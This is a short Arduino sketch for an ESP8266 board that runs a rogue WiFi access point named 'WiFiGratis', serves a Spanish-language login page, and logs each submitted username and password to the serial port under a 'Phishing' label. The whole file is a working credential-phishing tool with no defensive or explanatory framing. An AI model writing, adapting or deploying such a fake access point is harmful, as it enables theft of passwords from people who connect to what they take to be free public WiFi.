#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

const char* ssid = "WiFiGratis";
const char* password = "12345678";

ESP8266WebServer server(80);

void setup() {
  WiFi.softAP(ssid, password);
  IPAddress myIP = WiFi.softAPIP();
  Serial.println("AP IP address: ");
  Serial.println(myIP);

  server.on("/", []() {
    server.send(200, "text/html", "<h1>Bienvenido</h1><form action='/login' method='POST'><input name='user'><input name='pass'><input type='submit'></form>");
  });

  server.on("/login", HTTP_POST, []() {
    String user = server.arg("user");
    String pass = server.arg("pass");
    Serial.println("Phishing -> User: " + user + ", Pass: " + pass);
    server.send(200, "text/html", "<h1>Gracias</h1>");
  });

  server.begin();
}

void loop() {
  server.handleClient();
}
